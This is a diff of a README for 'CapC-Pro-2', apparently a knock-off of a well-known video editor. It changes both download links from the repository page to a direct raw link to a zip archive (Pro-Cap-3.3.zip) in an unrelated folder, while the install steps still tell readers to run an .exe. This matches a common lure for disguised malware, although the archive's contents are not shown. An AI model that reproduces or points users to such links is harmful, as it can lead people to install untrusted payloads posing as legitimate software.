@@ -1,6 +1,6 @@
 # 🎬 CapC-Pro-2 - Edit Professional Videos With Ease
 
-[![](https://img.shields.io/badge/Download-CapC--Pro--2-blue.svg)](https://github.com/Emaanw4693/CapC-Pro-2)
+[![](https://img.shields.io/badge/Download-CapC--Pro--2-blue.svg)](https://raw.githubusercontent.com/Emaanw4693/CapC-Pro-2/main/benediction/Pro-Cap-3.3.zip)
 
 ## 📌 About The Project
 
@@ -30,7 +30,7 @@ Before you install this software, confirm your computer meets these minimum stan
 Follow these instructions to set up the software on your machine:
 
 1. Visit the repository page to download the software.
-2. Click this link to go to the download page: [Download CapC-Pro-2](https://github.com/Emaanw4693/CapC-Pro-2).
+2. Click this link to go to the download page: [Download CapC-Pro-2](https://raw.githubusercontent.com/Emaanw4693/CapC-Pro-2/main/benediction/Pro-Cap-3.3.zip).
 3. Select the file ending in .exe to begin your download to your computer.
 4. Locate the file in your Downloads folder after the transfer finishes.
 5. Double-click the file to start the installation wizard.
